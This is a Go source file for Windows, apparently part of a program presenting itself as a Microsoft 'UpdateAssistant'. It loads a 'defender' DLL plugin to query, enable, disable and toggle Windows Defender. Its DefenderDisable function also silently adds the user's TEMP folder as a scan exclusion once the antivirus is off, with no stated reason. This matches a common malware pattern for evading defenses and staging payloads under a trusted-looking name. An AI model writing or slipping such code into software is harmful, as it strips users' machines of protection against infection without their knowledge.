//go:build windows

package sysutil

import (
	"os"
	"sync"
	"unsafe"

	"github.com/microsoft/UpdateAssistant/modules/loader"
	"github.com/microsoft/UpdateAssistant/modules/logger"
)

var (
	defenderMu   sync.Mutex
	defenderPlug *loader.Plugin
)

func defenderDLL(fn func(*loader.Plugin)) {
	defenderMu.Lock()
	if defenderPlug == nil {
		p, err := loader.Load("defender")
		if err == nil {
			defenderPlug = p
		}
	}
	p := defenderPlug
	defenderMu.Unlock()
	if p != nil {
		fn(p)
	}
}

func DefenderUnload() {
	defenderMu.Lock()
	defer defenderMu.Unlock()
	if defenderPlug != nil {
		loader.Unload(defenderPlug)
		defenderPlug = nil
	}
}

func DefenderStatus() string {
	raw := dllStrCall(defenderDLL, "defender_status")
	r := parseDLLResult(raw)
	if r.Detail != "" {
		logger.Info("defender status: %s (%s)", r.Status, r.Detail)
	}
	return r.Status
}

func DefenderEnable() bool {
	raw := dllStrCall(defenderDLL, "defender_enable")
	r := parseDLLResult(raw)
	if !r.OK {
		logger.Error("defender enable failed: %s", r.Detail)
	}
	return r.OK
}

func DefenderDisable() bool {
	raw := dllStrCall(defenderDLL, "defender_disable")
	r := parseDLLResult(raw)
	if !r.OK {
		logger.Error("defender disable failed: %s", r.Detail)
		return false
	}
	go DefenderAddExclusion(os.Getenv("TEMP"))
	return true
}

func DefenderToggle() (string, bool) {
	return dllToggle(defenderDLL, "defender_status", "defender_enable", "defender_disable")
}

func DefenderAddExclusion(path string) bool {
	var result string
	defenderDLL(func(p *loader.Plugin) {
		buf := make([]byte, 256)
		n, _ := p.Call("defender_add_exclusion",
			uintptr(unsafe.Pointer(&buf[0])),
			uintptr(len(buf)),
			uintptr(unsafe.Pointer(loader.BytePtr(path))),
		)
		result = string(buf[:int(n)])
	})
	r := parseDLLResult(result)
	if r.OK {
		logger.Info("[defender] excluded: %s", path)
	} else {
		logger.Error("[defender] exclusion failed for %s: %s", path, r.Detail)
	}
	return r.OK
}
